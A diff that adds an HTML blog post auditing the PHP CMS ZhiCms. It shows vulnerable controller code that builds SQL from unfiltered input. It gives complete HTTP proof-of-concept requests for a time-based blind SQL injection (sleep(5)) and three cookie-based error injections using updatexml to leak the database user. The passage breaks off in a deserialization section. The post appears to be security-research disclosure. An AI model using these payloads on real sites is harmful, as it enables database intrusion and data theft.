@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ZhiCms code audit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php-ZhiCms">
+<meta property="og:url" content="http://www.lxhsec.com/2020/02/01/php-code-audit/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="ZhiCms code audit">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-cookie-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-unserialize-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-unserialize-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-unserialize-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-unserialize-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-2-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-2-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-3-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-3-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-4-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-4-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-4-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-5-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-select-5-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-select-1-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-select-1-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-select-2-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-select-2-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-update-1-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-update-1-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-update-2-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-update-2-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-1-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-1-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-2-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-2-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-CSRF-1-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-admin-CSRF-1-02.png">
+<meta property="og:updated_time" content="2020-02-02T14:09:15.206Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php-ZhiCms">
+<meta name="twitter:description" content="ZhiCms code audit">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/02/01/php-code-audit/zhicms-sqli-01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/02/01/php-code-audit/"/>
+
+
+
+
+
+  <title>php-ZhiCms | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/02/01/php-code-audit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php-ZhiCms</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-01T15:59:39+08:00">
+                2020-02-01
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-02T22:09:15+08:00">
+                2020-02-02
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>ZhiCms code audit<a id="more"></a></p>
+<h1 id="ZhiCms"><a href="#ZhiCms" class="headerlink" title="ZhiCms"></a>ZhiCms</h1><p>ZhiCms is a website construction system that supports overseas online shopping mall in China.</p>
+<p>official site：<a href="https://www.zhicms.cc/" target="_blank" rel="external">https://www.zhicms.cc/</a></p>
+<p>Installation package download：<a href="https://www.zhicms.cc/d/zhicms.zip" target="_blank" rel="external">https://www.zhicms.cc/d/zhicms.zip</a></p>
+<p>installation：<a href="http://wiki.zhicms.cc/1377510" target="_blank" rel="external">http://wiki.zhicms.cc/1377510</a></p>
+<p>install: /install.php</p>
+<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><h3 id="Time-based-blind"><a href="#Time-based-blind" class="headerlink" title="Time-based blind"></a>Time-based blind</h3><p>Vulnerability code in：<br>zhicms/app/index/controller/appcontroller.php</p>
+<p>There are four injections in the index function:<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-01.png" alt="zhicms-sqli-01"></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-04.png" alt="zhicms-sqli-04"></p>
+<p>index function complete code：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</div><div class="line">		$model=<span class="keyword">$this</span>-&gt;arg(<span class="string">"model"</span>);</div><div class="line">	    $type=<span class="keyword">$this</span>-&gt;arg(<span class="string">"type"</span>);</div><div class="line">		$mall=<span class="keyword">$this</span>-&gt;arg(<span class="string">"mall"</span>);</div><div class="line">		$page=<span class="keyword">$this</span>-&gt;arg(<span class="string">"page"</span>);</div><div class="line">		$keywords=<span class="keyword">$this</span>-&gt;arg(<span class="string">"keywords"</span>);</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!$page || $page&lt;=<span class="number">0</span>)&#123;</div><div class="line">			$page=<span class="string">"1"</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//一个页面显示条数</span></div><div class="line">		$pageN=<span class="string">"30"</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>($keywords)&#123;</div><div class="line"></div><div class="line">			$where[]=<span class="string">"`title` LIKE  '%&#123;$keywords&#125;%'"</span>;</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">		<span class="keyword">if</span>($mall==<span class="string">"index"</span> || !$mall)&#123;</div><div class="line">		  $where[]=<span class="string">"`type` LIKE  '&#123;$model&#125;' AND  `mall` LIKE  '&#123;$model&#125;'"</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"hot"</span>)&#123;</div><div class="line">	    	$where[]=<span class="string">" date &gt;DATE_SUB(NOW(), INTERVAL 30 MINUTE)"</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"mall"</span>)&#123;</div><div class="line">	    	$where[]=<span class="string">"`mall` LIKE  '&#123;$model&#125;' AND  `mallb` =&#123;$type&#125;"</span>; <span class="comment">// sqli</span></div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"type"</span>)&#123;</div><div class="line">	    	$where[]=<span class="string">"`type` LIKE  '&#123;$model&#125;' AND  `typeb` =&#123;$type&#125;"</span>; <span class="comment">// sqli</span></div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    &#125;</div><div class="line"><span class="comment">//		var_dump($where);</span></div><div class="line">	 </div><div class="line">		$count=obj(<span class="string">"api/Apidata"</span>)-&gt;Data_Count(<span class="string">"items"</span>,$where);</div><div class="line"></div><div class="line">		<span class="comment">//共分几页</span></div><div class="line">		$indexpage=round($count/$pageN);</div><div class="line">		$pagesize=($page<span class="number">-1</span>)*$pageN;</div><div class="line">		<span class="keyword">if</span>($keywords)&#123;</div><div class="line"></div><div class="line">			$sql[]=<span class="string">"`title` LIKE  '%&#123;$keywords&#125;%'"</span>;</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>($mall==<span class="string">"index"</span> || !$mall) &#123;</div><div class="line">		 $sql[]=<span class="string">"`type` LIKE  '&#123;$model&#125;' AND  `mall` LIKE  '&#123;$model&#125;'"</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"hot"</span>)&#123;</div><div class="line">	     $sql[]=<span class="string">" date &gt;DATE_SUB(NOW(), INTERVAL 30 MINUTE)"</span>;	</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"mall"</span>)&#123;</div><div class="line">	    	$sql[]=<span class="string">"`mall` LIKE  '&#123;$model&#125;' AND  `mallb` =&#123;$type&#125;"</span>;<span class="comment">// sqli</span></div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span>($mall==<span class="string">"type"</span>)&#123;</div><div class="line"></div><div class="line">	    	$sql[]=<span class="string">"`type` LIKE  '&#123;$model&#125;' AND  `typeb` =&#123;$type&#125;"</span>; <span class="comment">// sqli</span></div><div class="line">	    &#125;</div><div class="line">		</div><div class="line">		&#125;</div><div class="line"></div><div class="line"></div><div class="line">		$ret=obj(<span class="string">"api/Apidata"</span>)-&gt;Data_Select(<span class="string">"items"</span>,$sql,<span class="string">"`id` DESC LIMIT &#123;$pagesize&#125; , &#123;$pageN&#125;"</span>);</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($ret))&#123;</div><div class="line">			<span class="keyword">exit</span>(<span class="string">"nodata"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span> ($ret <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">	    $mall= obj(<span class="string">"index/global"</span>, <span class="string">"controller"</span>)-&gt;type(<span class="string">"y"</span>, $value[<span class="string">'mallb'</span>], <span class="string">"mall"</span>, <span class="string">"id"</span>);</div><div class="line">	    $date=obj(<span class="string">"api/Api"</span>)-&gt;mdate($value[<span class="string">'date'</span>]);</div><div class="line"></div><div class="line">	    <span class="keyword">if</span>($keywords)&#123;</div><div class="line"></div><div class="line">	    	<span class="keyword">if</span>($value[<span class="string">'type'</span>]==<span class="string">"0"</span> &amp;&amp; $value[<span class="string">'mall'</span>]==<span class="string">"0"</span>)&#123;</div><div class="line">	    		$shtml=<span class="string">'&lt;div class="qufen guoneicss"&gt;国内&lt;/div&gt;'</span>;</div><div class="line">	    	&#125;<span class="keyword">else</span>&#123;</div><div class="line">	    		$shtml=<span class="string">'&lt;div class="qufen haitaocss"&gt;海淘&lt;/div&gt;'</span>;</div><div class="line">	    	&#125;</div><div class="line"></div><div class="line">	    &#125;</div><div class="line"></div><div class="line">		$html=<span class="string">'&lt;div class="itemsli"  onclick="openview('</span>.$value[<span class="string">'id'</span>].<span class="string">')" &gt;</span></div><div class="line"><span class="string">			   &lt;div class="itemsleftimg"&gt;'</span>.$shtml.<span class="string">'&lt;img src="'</span>.$value[<span class="string">'pic'</span>].<span class="string">'"&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">			   &lt;div class="itemsright"&gt;</span></div><div class="line"><span class="string">			      &lt;div class="itemstitle"&gt;'</span>.$value[<span class="string">'title'</span>].<span class="string">'&lt;/div&gt;</span></div><div class="line"><span class="string">			      &lt;div class="itemstps"&gt;&lt;span class="itemsmall haitaomall"&gt;'</span>.$mall[<span class="string">'name'</span>].<span class="string">'&lt;/span&gt;&lt;span class="itemstime"&gt;'</span>.$date.<span class="string">' - '</span>.$value[<span class="string">'ly'</span>].<span class="string">'&lt;/span&gt;&lt;/div&gt;</span></div><div class="line"><span class="string">			   &lt;/div&gt;</span></div><div class="line"><span class="string">			 &lt;/div&gt;'</span>;</div><div class="line"></div><div class="line">      <span class="keyword">echo</span> $html;</div><div class="line">&#125;</div><div class="line"></div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>$type value is not filtered, lead to SQL injection.</p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-02.png" alt="zhicms-sqli-02"></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-03.png" alt="zhicms-sqli-03"></p>
+<p>poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=index/app/index&amp;pw=zhangyuan HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Content-Length: 28</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://www.milicheng.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Referer: http://www.milicheng.com/index.php?r=index/app/index&amp;pw=zhangyuan</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=rravoasl1d528l46520trca4r7</div><div class="line">Connection: close</div><div class="line"></div><div class="line">mall=type&amp;type=1+or+sleep(5)</div></pre></td></tr></table></figure></p>
+<p>Executed twice sleep(5), So burp is ten seconds behind time.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-05.png" alt="zhicms-sqli-05"></p>
+<h3 id="Cookie-injection"><a href="#Cookie-injection" class="headerlink" title="Cookie injection"></a>Cookie injection</h3><p>Three Cookie injections</p>
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>Vulnerability code in：<br>zhicms/app/index/controller/ucentercontroller.php</p>
+<p>index function,Cookie ZhiCmsUser value is not filtered, lead to SQL injection.</p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-01.png" alt="zhicms-sqli-cookie-01"></p>
+<p>finduser:<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png" alt="zhicms-sqli-cookie-02"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=index/ucenter/index HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15; ZhiCmsUser=1&apos;+or+updatexml(2,concat(0x7e,(user())),0)%23</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-03.png" alt="zhicms-sqli-cookie-03"></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>Vulnerability code in：<br>zhicms/app/index/controller/ucentercontroller.php</p>
+<p>in like function,Cookie ZhiCmsUser value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-04.png" alt="zhicms-sqli-cookie-04"></p>
+<p>finduser:<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png" alt="zhicms-sqli-cookie-02"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=index/ucenter/like&amp;id=1 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15; ZhiCmsUser=1&apos;+or+updatexml(2,concat(0x7e,(user())),0)%23</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-05.png" alt="zhicms-sqli-cookie-05"></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>Vulnerability code in：<br>zhicms/app/index/controller/ucentercontroller.php</p>
+<p>comsend function,Cookie ZhiCmsUser value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-06.png" alt="zhicms-sqli-cookie-06"></p>
+<p>finduser:<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-02.png" alt="zhicms-sqli-cookie-02"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=index/ucenter/comsend&amp;model=index HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Content-Length: 21</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15; ZhiCmsUser=1&apos;+or+updatexml(2,concat(0x7e,(user())),0)%23</div><div class="line">Connection: close</div><div class="line"></div><div class="line">mybody=www.lxhsec.com</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-cookie-07.png" alt="zhicms-sqli-cookie-07"></p>
+<h3 id="Deserialization-lead-to-SQL-injection"><a href="#Deserialization-lead-to-SQL-injection" class="headerlink" title="Deserialization lead to SQL injection"></a>Deserialization lead to SQL injection</h3><p>Vulnerability code in：<br>zhicms/app/plug/controller/giftcontroller.php</p>
+<p>mylike function,Cookie mylike value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-unserialize-01.png" alt="zhicms-sqli-unserialize-01"></p>
+<p>itemsinfo:<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-unserialize-02.png" alt="zhicms-sqli-unserialize-02"></p>
